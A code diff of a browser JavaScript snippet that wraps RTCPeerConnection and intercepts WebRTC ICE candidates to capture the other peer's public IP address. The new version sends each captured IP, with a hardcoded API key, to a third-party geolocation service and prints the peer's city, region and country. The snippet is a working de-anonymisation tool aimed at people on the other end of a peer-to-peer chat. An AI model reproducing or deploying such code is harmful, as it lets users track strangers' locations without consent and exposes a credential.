@@ -1,20 +1,19 @@
-(function() {
-    console.log("--------------------------------------------------");
-    console.log("To change the tracker type in \"tracker = <url>=\"");
-    console.log("Example and Default: \"tracker = \"https://whatismyipaddress.com/ip/\"");
-    console.log("--------------------------------------------------");
-    window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection
-    window.RTCPeerConnection = function(...args) {
-        const pc = new window.oRTCPeerConnection(...args)
-        pc.oaddIceCandidate = pc.addIceCandidate
-        pc.addIceCandidate = function(iceCandidate, ...rest) {
-            const fields = iceCandidate.candidate.split(' ')
-            if (fields[7] === 'srflx') {
-                console.log('IP Address:', fields[4]);
-                console.log("https://whatismyipaddress.com/ip/" + fields[4]);
-            }
-            return pc.oaddIceCandidate(iceCandidate, ...rest)
-        }
-        return pc
-    }
-})();
+window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection
+window.RTCPeerConnection = function(...args) {
+	const pc = new window.oRTCPeerConnection(...args)
+	pc.oaddIceCandidate = pc.addIceCandidate
+	pc.addIceCandidate = function(iceCandidate, ...rest) {
+		const fields = iceCandidate.candidate.split(' ')
+		if (fields[7] === 'srflx') {
+			fetch('https://ip-geolocation.whoisxmlapi.com/api/v1?apiKey=at_yTh7AgkgBYR3dxffS50Hm06yCcYYT&ipAddress=' + fields[4])
+				.then(response => response.json())
+				.then(data => obj = data)
+				.then(() => console.log("IP:", obj.ip))
+				.then(() => console.log("City:", obj.location.city))
+				.then(() => console.log("Region:", obj.location.region))
+				.then(() => console.log("Country:", obj.location.country))
+		}
+		return pc.oaddIceCandidate(iceCandidate, ...rest)
+	}
+	return pc
+}
